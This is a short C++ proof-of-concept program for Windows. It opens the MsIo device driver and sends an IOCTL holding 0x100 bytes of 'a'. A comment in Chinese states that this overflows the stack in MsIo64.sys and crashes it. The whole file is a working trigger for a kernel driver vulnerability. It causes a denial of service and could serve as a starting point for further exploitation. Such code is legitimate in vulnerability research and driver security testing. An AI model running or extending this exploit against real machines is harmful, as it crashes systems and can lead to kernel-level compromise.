#include <Windows.h>
#include <iostream>

#define SymLinkName L"\\\\.\\MsIo"

int main(int argc, char* argv[])
{
    HANDLE hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        return 0;
    }

    DWORD dwWrite;

    // 輸入 0x100 個 'a' 讓 MsIo64.sys 因為 Stack Overflow 而崩潰
    char data[0x100];
    memset(data, 'a', 0x100);
    DeviceIoControl(hDevice, 0x80102040, data, sizeof(data), NULL, 0, &dwWrite, NULL);

    CloseHandle(hDevice);
    return 0;
}